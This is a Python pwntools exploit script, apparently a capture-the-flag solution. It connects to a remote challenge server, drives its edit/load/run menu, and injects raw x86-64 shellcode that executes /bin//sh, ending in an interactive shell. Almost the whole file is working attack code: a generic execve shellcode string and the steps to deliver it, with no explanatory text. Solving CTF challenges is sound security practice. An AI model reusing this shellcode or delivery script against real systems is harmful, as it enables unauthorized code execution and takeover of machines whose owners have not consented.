from pwn import * 
from pwn import p64,u64
# # from LibcSearcher import *

debug = 0
gdb_is = 0
# context(arch='i386',os = 'linux')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    if not gdb_is:
        r = process("./pwn")
        p = process("./pwn")
    
else:
    host = "ctf.buptmerak.cn:20873"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    p = connect(host.split(':')[0],host.split(':')[1])
    gdb_is =0

if gdb_is:
    r = gdb.debug("./pwn",'b *run_code + 0xba')

    # 00000001556 00000149C 0xba

    pass

def edit(server,payload):
    server.sendlineafter(b'>>>',b'1')
    server.sendafter(b'>>>',payload)

def load(server):
    server.sendlineafter(b'>>>',b'2')

def run(server):
    server.sendlineafter(b'>>>',b'3')



# >0x4F <= 0x55

# P	0x50 push %rax
# Q	0x51 push %rcx
# R	0x52 push %rdx
# S	0x53 push %rbx
# T	0x54 push %rsp
# U	0x55 push %rbp




payload = b'T' * 0x20
edit(r,payload)
load(r)
run(r)
payload = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'

edit(p,payload)
load(p)
r.sendlineafter(b'no\n',b'1')
r.interactive()